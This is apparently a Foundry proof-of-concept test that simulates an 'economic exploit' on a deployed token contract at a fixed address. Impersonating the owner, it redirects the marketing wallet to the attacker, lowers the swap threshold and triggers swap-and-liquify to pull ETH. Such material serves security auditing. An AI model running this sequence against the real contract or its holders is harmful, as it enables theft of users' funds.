pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Elo {
    function owner() external view returns (address);
    function setMarketingWallet(address newWallet) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function setNumTokensToAddLiquidity(uint256 _numTokensSellToAddToLiquidity) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x35207068e057a01861A654463c01B04cc111E760;
    address attacker = address(this);
    Elo elo;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        elo = Elo(TARGET);
        owner = elo.owner();

        deal(address(this), 100 ether);

        // Give attacker a small amount of tokens for the exploit
        deal(TARGET, address(this), 100 * 1e9);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        uint256 newSwapThreshold = 1e9; // Set threshold to 1 token

        vm.startPrank(owner);
        // Lower the swap threshold to a minimum to make the exploit cheap
        elo.setNumTokensToAddLiquidity(newSwapThreshold);
        // Set the marketing wallet to the attacker's address
        elo.setMarketingWallet(payable(attacker));
        // Ensure the swap and liquify mechanism is enabled
        elo.setSwapAndLiquifyEnabled(true);
        vm.stopPrank();

        // 1. Prime the contract's token balance to meet the new, lower threshold.
        elo.transfer(TARGET, newSwapThreshold);

        // 2. Trigger the swapAndLiquify function by executing another transfer.
        // The contract will detect its balance is above the threshold and perform the swap.
        elo.transfer(address(0xdead), 1e9);
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

